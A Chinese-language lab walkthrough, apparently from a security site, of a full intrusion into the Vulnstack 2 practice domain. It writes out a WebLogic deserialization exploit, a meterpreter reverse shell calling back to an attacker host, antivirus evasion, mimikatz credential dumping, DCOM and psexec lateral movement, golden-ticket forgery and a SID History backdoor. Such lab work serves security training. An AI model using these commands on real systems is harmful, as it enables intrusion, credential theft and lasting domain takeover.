![20210118195941.jpg](https://image.3001.net/images/20210120/1611080970_6007250a97f65036eca07.jpg!small)

## 前言

在上一节[《记一次Vulnstack靶场内网渗透（二）》](.../network/244704.html)中，我们简单的对vulnstack
4的靶场环境做了一次测试，通过外网初探、信息收集、攻入内网最终拿下域控。在本节中，我们将对vulnstack
2这个靶场进行渗透测试。靶场地址：<http://vulnstack.qiyuanxuetang.net/vuln/detail/3/>

> 本次靶场环境主要包括Access Token利用、WMI利用、域漏洞利用SMB relay，EWS
> relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。
>
>   1. Bypass UAC
>
>   2. Windows系统NTLM获取
>
>   3. Access Token利用（MSSQL利用）
>
>   4. WMI利用
>
>   5. 网页代理，二层代理，特殊协议代理
>
>   6. 域内信息收集
>
>   7. 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用
>
>   8. 域凭证收集
>
>   9. 后门技术（黄金票据、白银票据、Sid History、MOF）
>
>

### 环境准备

![image-20210118230121014](https://image.3001.net/images/20210120/1611080971_6007250b9de499f94e594.png!small)

 **域控服务器：**

> 内网IP：10.10.10.10
>
> 系统：Windows Server 2012（64位）
>
> 用户名：de1ay

 **WEB服务器：**

> 模拟外网IP：192.168.1.8
>
> 内网IP：10.10.10.80
>
> 系统：Windows Server 2008（64位）
>
> 用户名：

 **PC域内主机：**

> 内网IP：10.10.10.201
>
> 系统：Windows 7（32位）
>
> 用户名：

 **攻击者VPS：**

> 模拟外网IP：192.168.1.7
>
> 系统：Linux

Web服务器有两个网卡，一个网卡连接外网，对外提供web服务，另一个网卡连接内网。域成员主机Windows
7和域控制器位于内网，域成员主机可以没有公网IP但能上网，域控制器只能与内网连通，不能与外网通信。

## 外网渗透

我们已知Web服务器的公网IP为192.168.1.8（模拟），所以，我们先对其Web服务器进行端口扫描：

    
    
    nmap -T4 -sC -sV 192.168.1.8

![image-20210119143000169](https://image.3001.net/images/20210120/1611080973_6007250da93a9cf8a5194.png!small)

发现目标主机上开放1433端口和7001端口，分别运行着Mssql和Weblogic服务，我们先从7001端口上的Weblogic下手。

### WebLogic 10.3.6.0

访问目标WebLogic服务器控制台：

![image-20210119143834403](https://image.3001.net/images/20210120/1611080975_6007250fa44fae1184b9f.png!small)

发现WebLogic的版本是10.3.6.0，用[Weblogic一键漏洞检测工具](https://github.com/rabbitmask/WeblogicScan)一把梭，该工具提供WebLogic一键poc检测，收录几乎全部weblogic历史漏洞：

![image-20210119150045520](https://image.3001.net/images/20210120/1611080977_6007251160152c795b95d.png!small)

存在的漏洞还真不少。先试试CVE-2019-2725，我们在metasploit上找到了该漏洞的利用模块`exploit/multi/misc/weblogic_deserialize_asyncresponseservice`：

![image-20210119154939002](https://image.3001.net/images/20210120/1611080979_60072513bcd3f06f2bc91.png!small)

但是该模块所携带的payload是针对unix环境的，在windows的环境自然没办法反弹回meterpreter。找遍全网，我找到了如下解决方法：去
[exploit-db](https://www.exploit-db.com/exploits/46780)下载这个exploit脚本，然后攻击者使用如下命令生成一个powershell格式的木马：

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f psh-cmd > shell.ps1

用著名的APT32组织海莲花常用的一个工具Invoke-Obfuscation对生成的shell.ps1做一下简单的免杀。

然后将刚下载的exploit脚本中的exploit变量替换为生成的shell.ps1脚本中的内容。然后在msfconsole中设置好监听：

![image-20210119160020256](https://image.3001.net/images/20210120/1611080981_600725159c61f346334b5.png!small)

然后执行exploit脚本：

    
    
    python3 exploit.py http://192.168.1.8:7001/_async/AsyncResponseServiceHttps

执行后，msfconsole成功得到目标主机的meterpreter，并且为管理员权限：

![image-20210119160453015](https://image.3001.net/images/20210120/1611080982_60072516e98fcbf4f8e82.png!small)

## 内网信息收集

拿到了目标Web服务器的权限后，我们开始对目标主机及其所在的网络环境进行信息收集。

### 本机信息收集

    
    
    systeminfo    // 查看操作系统信息  
    echo %PROCESSOR_ARCHITECTURE%    // 查看系统体系结构

![image-20210119171656935](https://image.3001.net/images/20210120/1611080986_6007251a738f5920fe5a6.png!small)

    
    
    ipconfig /all              // 查询本机IP段，所在域等

![image-20210119171542287](https://image.3001.net/images/20210120/1611080988_6007251c4eacd421829e5.png!small)

    
    
    whoami   // 查看当前用户、权限  
    net user                                // 查看本地用户  
    net localgroup administrators           // 查看本地管理员组（通常包含域用户）

![image-20210119171913808](https://image.3001.net/images/20210120/1611080989_6007251d64dc60b2acb0c.png!small)

综上可知目标Web服务器主机的操作系统为Windows Server
2008，具有两个网卡分别连通192.168.1.1/24和10.10.10.1/24两个网段。

### 域内信息收集

    
    
    net config workstation     // 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等  
    net view /domain              // 查看域  
    net time /domain           // 主域服务器会同时作为时间服务器  
    net user /domain      // 查看域用户  
    net group /domain     // 查看域内用户组列表  
    net group "domain computers" /domain      // 查看域内的机器  
    net group "domain controllers" /domain          // 查看域控制器组  
    net group "Enterprise Admins" /domain    // 查看域管理员组

![image-20210119173542371](https://image.3001.net/images/20210120/1611080991_6007251f0610e1775517f.png!small)

![image-20210119192952914](https://image.3001.net/images/20210120/1611080992_60072520e6e1e15120ddb.png!small)

![image-20210119192838705](https://image.3001.net/images/20210120/1611080994_60072522e46ab913a9189.png!small)

从收集的信息可知，目标主机所在的网络存在域环境，域名为de1ay.com，存在两台域主机WEB和PC，域控制器为DC.de1ay.com，主机名为DC，域管理员为Administrator。

## 攻入内网

我们先使用socks代理工具[chisel](https://github.com/jpillora/chisel%20)在目标主机WEB的1090端口上搭建一个socks5代理服务。

在目标主机上传Windows版的chisel，然后执行如下命令启动socks5代理服务器：

    
    
    start /b chisel.exe server -p 1090 --socks5  
    ​  
    // start /b为后台运行

![image-20210119200935069](https://image.3001.net/images/20210120/1611080996_600725244250608264caa.png!small)

攻击机执行如下命令启动socks5客户端：

    
    
    nohup ./chisel_for_linux64 client 192.168.1.8:1090 socks &

如下图，成功在攻击机上面的1080端口开启了一个socks5监听：

![image-20210119204320438](https://image.3001.net/images/20210120/1611080997_600725254c3260bc39837.png!small)

然后再配置攻击机的代理工具proxychains4：

    
    
    vim /etc/proxychains4.conf

![image-20210119204427167](https://image.3001.net/images/20210120/1611080998_60072526aaab83cf6edea.png!small)

此时，我们攻击机上的应用程序就可以通过proxychains4代理进目标内网了。探测目标内网的主机存活：

    
    
    proxychains4 nmap -A -F -sT -Pn 10.10.10.1/24 > nmap_res.txt   

> -Pn和-sT必须要加上，否则扫描失败

![image-20210119211545491](https://image.3001.net/images/20210120/1611081000_600725283b68005bec52b.png!small)

通过扫描发现，内网中还存在10.10.10.10和10.10.10.201这两台主机，对应的主机名分别为DC和PC。

## 横向移动

既然是攻击内网，我们当然少不了试试永恒之蓝了，在msfconsole里面执行`setg Proxies
socks5:127.0.0.1:1080`，把msf代理进内网（也可以添加路由）：

![image-20210119205609504](https://image.3001.net/images/20210120/1611081002_6007252a221d4451e6e2a.png!small)

扫描目标内网中存在ms17_010的主机：

![image-20210119212639319](https://image.3001.net/images/20210120/1611081006_6007252e25dea2169dbda.png!small)

发现两个主机都存在漏洞，先打尝试那个PC（10.10.10.201）：

    
    
    setg Proxies socks5:127.0.0.1:1080       // 预先设置好代理  
    use exploit/windows/smb/ms17_010_eternalblue  
    set payload windows/x64/meterpreter/bind_tcp  
    set rhost 10.10.10.201  
    set lport 4444  
    set AutoRunScript post/windows/manage/migrate             // 自动迁移进程  
    run

![image-20210119213056549](https://image.3001.net/images/20210120/1611081008_600725307dc7912b675a6.png!small)

失败了，又尝试了一下DC，好家伙，直接蓝屏了，只能走别的路了。在WEB主机上用mimikatz抓一下域用户的密码，为了能绕过360，我们要对mimikatz进行免杀，使用Tide安全团队的系列文章《远控免杀专题》中的[msf加载bin的方法](https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247486304&idx=1&sn=b129ccc7e7c216a7c1ddabc76422d99d&chksm=ce5e2901f929a01780d94b7b90cba5991eb1c38e53282dd95cfb44455792845f655422a5db9f&mpshare=1&scene=23&srcid=&sharer_sharetime=1588207545317&sharer_s#%E6%96%B9%E6%B3%9510)，需要用到
[Donut](https://github.com/TheWover/donut)和
[shellcode_inject.rb](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/shellcode_inject.rb)。

首先使用Donut对需要执行的文件进行shellcode生成，这里对mimikatz进行shellcode生成，生成bin文件mimi.bin，等下会用到：

    
    
    ./donut -f 1 mimikatz.exe -a 2 -o mimi.bin

![image-20210119221425322](https://image.3001.net/images/20210120/1611081010_6007253286477735b048b.png!small)

然后将上面的 shellcode_inject.rb 放入`/usr/share/metasploit-framework/modules/post/windows/manage/`目录下，然后进入msfconsole，执行`reload_all`载入所有模块。

此时，我们便可以使用刚才载入的shellcode_inject模块来将mimi.bin注入执行了：

    
    
    use post/windows/manage/shellcode_inject  
    set session 2  
    set shellcode /root/mimi.bin  
    set CHANNELIZED true  
    set INTERACTIVE true    // 这两个一定要设为true，不然无交互式界面。  
    run

最后成功加载了mimikatz：

![image-20210119224502081](https://image.3001.net/images/20210120/1611081011_60072533e5e06421f08b1.png!small)

成功抓取到administrator、de1ay、mssql这三个域用户的密码，皆为1qaz@WSX：

![image-20210119224847138](https://image.3001.net/images/20210120/1611081013_600725355fa5067bab9c6.png!small)

![image-20210119224939134](https://image.3001.net/images/20210120/1611081014_60072536c55a5cdb9b2c3.png!small)

![image-20210119225017151](https://image.3001.net/images/20210120/1611081016_600725386535ced33486b.png!small)

有了用户名和密码，拿下PC和域控就简单多了。

我们先控制WEB主机与PC建立一个ipc$连接：

    
    
    net use \\10.10.10.201\ipc$ "1qaz@WSX" /user:administrator

![image-20210119231000153](https://image.3001.net/images/20210120/1611081017_60072539e317febece549.png!small)

然后，我们新生成一个msf木马shell2.exe并稍做免杀，上传到WEB主机上，然后在WEB主机上执行如下命令，将木马复制到远程主机PC上：

    
    
    copy shell2.exe \\10.10.10.201\c$

![image-20210119232811706](https://image.3001.net/images/20210120/1611081018_6007253ae762fac31f45d.png!small)

然后再meterpreter中载入powershell模块：

    
    
    load powershell     // 载入powershell模块  
    powershell_shell    // 进入powershell交互模式

![image-20210119232000595](https://image.3001.net/images/20210120/1611081019_6007253befc8fbc002e80.png!small)

在powershell里面执行如下命令，控制WEB主机使用DCOM在远程机器PC上执行刚刚上传到PC主机C盘里的木马：

    
    
    $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.201")  
    $obj = [System.Activator]::CreateInstance($com)  
    $item = $obj.item()  
    $item.Document.Application.ShellExecute("cmd.exe","/c c:\shell2.exe","c:\windows\system32",$null,0)

![image-20210119233429042](https://image.3001.net/images/20210120/1611081021_6007253d72679fa4223c6.png!small)

如上图所示，成功执行PC主机C盘里的木马，并成功得到了PC主机的meterpreter。

经扫描，主机PC开放3389端口：

![image-20210119234829717](https://image.3001.net/images/20210120/1611081022_6007253ee1d43334ee9fb.png!small)

尝试登录PC远程桌面，成功：

![image-20210119235343230](https://image.3001.net/images/20210120/1611081031_6007254799d9c20e1a486.png!small)

## 进攻域控

直接利用msf的exploit/windows/smb/psexec模块进行哈希传递：

    
    
    use exploit/windows/smb/psexec  
    set payload windows/x64/meterpreter/bind_tcp  
    set rhost 10.10.10.10  
    set SMBUser administrator  
    set SMBPass 1qaz@WSX  
    run

成功拿下域控制器，并且是system权限：

![image-20210120010129280](https://image.3001.net/images/20210120/1611081033_60072549bb6894e4b663f.png!small)

## 域控权限维持

### 黄金票据

>
> 假设又这么一种情况，我们已拿到的域内所有的账户Hash，包括krbtgt账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。

首先，我们登上域控制器，像之前一样用shellcode_inject启动mimikatz，然后执行如下命令抓取krbtgt用户的Hash值并获取域sid：

    
    
    privilege::debug  
    lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash

![image-20210120011748380](https://image.3001.net/images/20210120/1611081034_6007254ae3a650f31387e.png!small)

如上图所示，我们得到krbtgt用户的Hash为：82dfc71b72a11ef37d663047bc2088fb，域sid为S-1-5-21-2756371121-2868759905-3853650604

然后，我们切换到普通域用户的WEB主机或PC主机，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为域管理员用户（administrator）：

    
    
    kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi  
    ​  
    # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi

![image-20210120014900469](https://image.3001.net/images/20210120/1611081036_6007254c748e082d3383b.png!small)

生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后再在mimikatz中将凭证ticket.kirbi注入进去：

    
    
    kerberos::purge   //先清空所有票据  
    kerberos::ptt ticket.kirbi    //再将生成的票据注入域用户主机Windows7中  
    // kerberos::ptt <票据文件>   

![image-20210120015005714](https://image.3001.net/images/20210120/1611081037_6007254d5bab69dcf9c79.png!small)

此时查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：

    
    
    kerberos::tgt

![image-20210120015100473](https://image.3001.net/images/20210120/1611081038_6007254e30b8a104a4cbb.png!small)

到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用这台普通域用户的主机任意访问域控制器了，如下列出域控的C盘目录：

    
    
    dir \\DC\c$

![image-20210120015623062](https://image.3001.net/images/20210120/1611081039_6007254f605003216923f.png!small)

也可以使用psexec，wmi等方法通过WEB主机对DC进行远程执行命令了，具体操作不再演示。

### SID History域后门

在Windows中，每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。

> 如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID
> History的作用是在域迁移过程中保持域用户的访问权限，即 **如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID
> History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源** 。使用mimikatz，可以将SID
> History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID
> History作为实现持久化的方法。

下面我们演示用mimikatz添加SID History后门的操作。

首先我们在域控制器上新建一个恶意用户“whoami”：

    
    
    net user whoami Liu78963 /add

![image-20210120020448444](https://image.3001.net/images/20210120/1611081040_600725509c420c2c3201b.png!small)

然后像之前一样用shellcode_inject启动mimikatz，然后执行如下命令，将域管理员Administrator的SID添加到恶意域用户
whoami 的SID History属性中。

    
    
    privilege::debug  
    sid::patch  
    sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中

![image-20210120020742359](https://image.3001.net/images/20210120/1611081042_60072552db69460801f85.png!small)

注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID
History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。

然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：

    
    
    Import-Module activedirectory  
    Get-ADUser whoami -Properties sidhistory  
    Get-ADUser administrator -Properties sidhistory

![image-20210120021253352](https://image.3001.net/images/20210120/1611081044_6007255477831dd025a5c.png!small)

如上图所示，whoami用户的SID
History和administrator域管理员的sid相同，那么现在我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户随时登录域控主机。

## Ending......

![](https://image.3001.net/images/20210120/1611080849_60072491f25c988e68d86.jpg!small)个人博客：https://whoamianony.top/

> 参考：
>
> <https://www.freebuf.com/articles/web/252963.html>
>
>
> [https://www.freebuf.com/articles/network/251364.html﻿](https://www.freebuf.com/articles/network/251364.html)

